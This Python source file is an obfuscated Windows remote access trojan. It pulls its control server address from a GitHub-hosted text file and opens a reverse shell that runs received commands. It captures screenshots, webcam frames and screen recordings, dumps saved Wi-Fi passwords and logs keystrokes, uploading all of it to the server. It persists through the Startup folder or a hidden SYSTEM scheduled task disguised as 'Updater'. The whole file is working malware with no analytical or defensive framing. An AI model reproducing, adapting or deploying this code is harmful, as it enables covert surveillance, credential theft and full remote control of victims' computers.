import urllib.request,subprocess,socket,time,os,json,base64,shutil,re,ctypes
from datetime import datetime
WFakxipmgxvnjfb = ""
mnmbxHOmLvSssRyncB = ""
MNsAvXmsdsmdx = "01.08.26.4"
GRPVzJj = True
IgSGpUWqGEkKeOkOpp = "!"
wStYvAswjbeRwTsoqbKjLkO = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
vhqNqtBprCnJySlNWEGDE = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
FDxmOqmRscNtxDJ = ""
def is_elevated():
	try:
		return os.geteuid() == 0
	except AttributeError:
		return ctypes.windll.shell32.IsUserAnAdmin() != 0
STARTUP_PATH = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup") if not is_elevated() else "C:\\ProgramData\\MicrosoftUpdater\\"
hujbtDPn = os.path.expanduser("~\\AppData\\Local\\") if not is_elevated() else STARTUP_PATH
try:
	if not os.path.exists(hujbtDPn):
		os.mkdir(hujbtDPn)
except:
	pass
def IsbjkDmzvNtE(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def qFXdqasvySPfUFXdFYs(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	XXmbbOQQOLqYvmm = data.decode("utf-8").replace("\n","")
	if not XXmbbOQQOLqYvmm.startswith(IgSGpUWqGEkKeOkOpp):
		proc = subprocess.run(XXmbbOQQOLqYvmm, shell=True, capture_output=True)
		BGDpowogiaffdCai = proc.stdout + proc.stderr
		elFHUNbhLYEyeVJqcEguGc(s, BGDpowogiaffdCai)
		return
	anLjpPdLElfA = XXmbbOQQOLqYvmm.split(" ")[0][1:]
	args = " ".join(XXmbbOQQOLqYvmm.split()[1:]).split()
	if anLjpPdLElfA == "cd":
		moveDirectory(s, XXmbbOQQOLqYvmm[4:])
	elif anLjpPdLElfA == "screenshot":
		dJMoLIpQypk(s)
	elif anLjpPdLElfA == "webcam":
		OYeztpLlnbuwc(s, args)
	elif anLjpPdLElfA == "download":
		RRlRtcHWtNYMfwSY(s, XXmbbOQQOLqYvmm)
	elif anLjpPdLElfA == "upload":
		rPoQVBpDqYws(s, XXmbbOQQOLqYvmm)
	elif anLjpPdLElfA == "wifi":
		YYpmxxAcMryViVeqz(s)
	elif anLjpPdLElfA == "screenrecord":
		SmDSSusOLOGHCCiSwErZ(s, args)
	elif anLjpPdLElfA == "update":
		knWSsOZJxsdPYHsGKs(s)
	elif anLjpPdLElfA == "basename":
		elFHUNbhLYEyeVJqcEguGc(s, os.path.basename(__file__))
	else:
		elFHUNbhLYEyeVJqcEguGc(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		elFHUNbhLYEyeVJqcEguGc(s,"")
	except:
		elFHUNbhLYEyeVJqcEguGc(s, "[!] 404")
def RRlRtcHWtNYMfwSY(s, XXmbbOQQOLqYvmm):
	DsjlfaSGztmVtrlgW = XXmbbOQQOLqYvmm.replace(IgSGpUWqGEkKeOkOpp+"download ","").split(",")
	BGDpowogiaffdCais = ""
	for f in DsjlfaSGztmVtrlgW:
		BGDpowogiaffdCais += XGbjTci(f, "api/file/", { "type":os.path.splitext(f)[1] })
	elFHUNbhLYEyeVJqcEguGc(s, BGDpowogiaffdCais)
def dJMoLIpQypk(s):
	from PIL.ImageGrab import grab
	global hujbtDPn
	image = grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	yXfHyFijYuEsP = os.path.join(hujbtDPn, "ss.jpg")
	image.save(yXfHyFijYuEsP)
	image.close()
	BGDpowogiaffdCai = XGbjTci(yXfHyFijYuEsP, "api/sscap")
	os.remove(yXfHyFijYuEsP)
	elFHUNbhLYEyeVJqcEguGc(s, BGDpowogiaffdCai)
def OYeztpLlnbuwc(s, args):
	from cv2 import VideoCapture, imwrite
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = VideoCapture(cameraNumber)
		_, frame = cam.read()
		imwrite(hujbtDPn+fname, frame)
		cam.release()
		r=XGbjTci(hujbtDPn+fname,"api/wc")
		os.remove(hujbtDPn+fname)
		elFHUNbhLYEyeVJqcEguGc(s, r)
	except Exception as e:
		elFHUNbhLYEyeVJqcEguGc(s, "[!] 404: "+str(e))
def SmDSSusOLOGHCCiSwErZ(s, args):
	from imageio import mimsave
	from PIL.ImageGrab import grab
	global hujbtDPn
	LoqUTsEsERcjm = 15
	if not args == []:
		try: LoqUTsEsERcjm = int(args[0])
		except: pass
	qdTJSsbcRRbjRkTQo = os.path.expanduser(hujbtDPn, "sr.mp4")
	xXXKJuosAj = []
	fps = 11
	numFrames = LoqUTsEsERcjm * fps
	for _ in range(numFrames):
		xXXKJuosAj.append(grab(bbox=None, all_screens=True))
	mimsave(qdTJSsbcRRbjRkTQo, xXXKJuosAj, fps=fps, quality=8)
	r=XGbjTci(qdTJSsbcRRbjRkTQo, "api/screc")
	os.remove(qdTJSsbcRRbjRkTQo)
	elFHUNbhLYEyeVJqcEguGc(s, r)
def XGbjTci(RkpyqgqsKn, cBiUvADtgRXf, RdmTSzgNFHKphWLaVaNf=None):
	from requests import post
	if not os.path.isfile(RkpyqgqsKn):
		return "[!] 404: "+RkpyqgqsKn+"\n"
	headers = {"user":os.getlogin()}
	if RdmTSzgNFHKphWLaVaNf is not None:
		headers = {**headers, **RdmTSzgNFHKphWLaVaNf}
	f = open(RkpyqgqsKn, "rb")
	post("http://"+WFakxipmgxvnjfb+":5555/"+cBiUvADtgRXf,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def rPoQVBpDqYws(s, XXmbbOQQOLqYvmm):
	from requests import get
	FwWGLzbOQTVZiCIgratKE = XXmbbOQQOLqYvmm.split(" ")[-1]
	cudLSta = XXmbbOQQOLqYvmm.replace(IgSGpUWqGEkKeOkOpp+"upload ","").replace(" "+FwWGLzbOQTVZiCIgratKE,"")
	if os.path.exists(cudLSta) or os.path.isfile(cudLSta):
		elFHUNbhLYEyeVJqcEguGc(s, "[!] 409")
		return
	response = get(f"http://{WFakxipmgxvnjfb}:5555/api/content/{FwWGLzbOQTVZiCIgratKE}", headers={"auth":"981xyz"})
	if response.status_code != 200:
		elFHUNbhLYEyeVJqcEguGc(s, "[!] 404")
		return
	with open(cudLSta, "wb") as f:
		f.write(response.content)
	elFHUNbhLYEyeVJqcEguGc(s, "[+] 200")
def BrWjkkDqejnBG(VsPxwGipWLfyfxvLdvrVoW, cBiUvADtgRXf):
	from requests import post
	if VsPxwGipWLfyfxvLdvrVoW.strip() == "":
		return "[!] 204"
	post("http://"+WFakxipmgxvnjfb+":5555/"+cBiUvADtgRXf,
		data=VsPxwGipWLfyfxvLdvrVoW,
		headers={"user":os.getlogin()})
	return "[+] 200"
def knWSsOZJxsdPYHsGKs(s):
	h, p, v = GqLjVfbJLZhMLRzBWAKVoEh(True)
	if (v != MNsAvXmsdsmdx):
		xWmRfuBRnZjjRsijWF(v)
		elFHUNbhLYEyeVJqcEguGc(s, "[+] 200")
	else:
		elFHUNbhLYEyeVJqcEguGc(s, "[-] 304")
def YYpmxxAcMryViVeqz(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		elFHUNbhLYEyeVJqcEguGc(s, "[!] 500")
		return
	KpTYuPncN = ""
	for p in profiles:
		try: KpTYuPncN+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: KpTYuPncN+=f"    {p} - N/A"
	elFHUNbhLYEyeVJqcEguGc(s, KpTYuPncN)
def xWmRfuBRnZjjRsijWF(NMxWqFqFDVEEhjtGaBeWnk):
	import sys
	from requests import get
	global GRPVzJj, STARTUP_PATH
	p = sys.executable if getattr(sys, "frozen", False) else __file__
	name, ext = os.path.basename(p).split('.')[0], os.path.splitext(p)[1]
	py = ext.startswith(".py")
	file = f"{name}.{NMxWqFqFDVEEhjtGaBeWnk}.{'pyw' if py else 'exe'}"
	source = f"file.{'pyw' if py else 'exe'}"
	path = os.path.join(STARTUP_PATH, file)
	if not os.path.isfile(path):
		r = get(vhqNqtBprCnJySlNWEGDE + source)
		with open(path, "w" if py else "wb") as f:
			f.write(r.text if py else r.content)
		if is_elevated():
			path = f'"{sys.executable}" "{path}"' if py else path
			subprocess.run([ "schtasks", "/create", "/tn", "Updater", "/tr", path, "/sc", "onstart", "/ru", "SYSTEM", "/rl", "highest", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
	else:
		GRPVzJj = False
def GqLjVfbJLZhMLRzBWAKVoEh(force=False):
	global WFakxipmgxvnjfb, mnmbxHOmLvSssRyncB
	if force or WFakxipmgxvnjfb == "" or mnmbxHOmLvSssRyncB == "":
		while True:
			try:
				with urllib.request.urlopen(wStYvAswjbeRwTsoqbKjLkO) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					WFakxipmgxvnjfb = data[0].strip()
					mnmbxHOmLvSssRyncB = data[1].strip()
					NMxWqFqFDVEEhjtGaBeWnk = data[2].strip()
					return WFakxipmgxvnjfb, mnmbxHOmLvSssRyncB, NMxWqFqFDVEEhjtGaBeWnk
			except:
				time.sleep(10)
def dUhJcXmnJXy():
	try:
		BjRzRCBu = "settings.xpb"
		CMchbQEvlqrR = sorted([file for file in os.listdir(hujbtDPn) if os.path.isfile(hujbtDPn+"\\"+file) and file.endswith(BjRzRCBu.split(".")[-1])])
		if BjRzRCBu in CMchbQEvlqrR:
			CMchbQEvlqrR.remove(BjRzRCBu)
		oKLNlPUcTGPH = os.path.join(hujbtDPn,BjRzRCBu)
		if len(CMchbQEvlqrR) > 0:
			with open(oKLNlPUcTGPH, "ab+") as f:
				for file in CMchbQEvlqrR:
					temp = os.path.join(hujbtDPn,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		XGbjTci(oKLNlPUcTGPH, "api/log")
		if os.path.isfile(oKLNlPUcTGPH):
			os.remove(oKLNlPUcTGPH)
	except:
		pass
def nSYJaruQBWqKjFqGKIPmAYd():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(hujbtDPn+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def acEQnpsDfLOkFEltgmob(k):
		logging.info(str(k))
	k=Listener(on_press=acEQnpsDfLOkFEltgmob)
	xTezIsiXssD = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in xTezIsiXssD:
		l.setLevel(logging.CRITICAL)
	k.start()
def elFHUNbhLYEyeVJqcEguGc(clientSocket, VsPxwGipWLfyfxvLdvrVoW):
	formattedData = b""
	if type(VsPxwGipWLfyfxvLdvrVoW) == bytes:
		formattedData += VsPxwGipWLfyfxvLdvrVoW
	else:
		formattedData += bytes(VsPxwGipWLfyfxvLdvrVoW, "utf-8")
	formattedData += bytes("\n"+FDxmOqmRscNtxDJ+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def CgAdirbokAImsBQixj():
	global FDxmOqmRscNtxDJ
	h, p, v = GqLjVfbJLZhMLRzBWAKVoEh()
	try: dUhJcXmnJXy()
	except: pass
	try:
		if MNsAvXmsdsmdx != v:
			xWmRfuBRnZjjRsijWF(v)
	except: pass
	try:
		if GRPVzJj:
			nSYJaruQBWqKjFqGKIPmAYd()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	FDxmOqmRscNtxDJ = ("(old)"if MNsAvXmsdsmdx!=v else "")+"["+MNsAvXmsdsmdx+"] "+(os.getlogin() if os.getlogin() != "SYSTEM" else socket.gethostname())+" - "
	while True:
		alvgcPCkekEE=False
		try:
			s=IsbjkDmzvNtE(h, p)
			elFHUNbhLYEyeVJqcEguGc(s, "")
			while not alvgcPCkekEE:
				try: alvgcPCkekEE=qFXdqasvySPfUFXdFYs(s)
				except Exception as e:
					elFHUNbhLYEyeVJqcEguGc(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
CgAdirbokAImsBQixj()
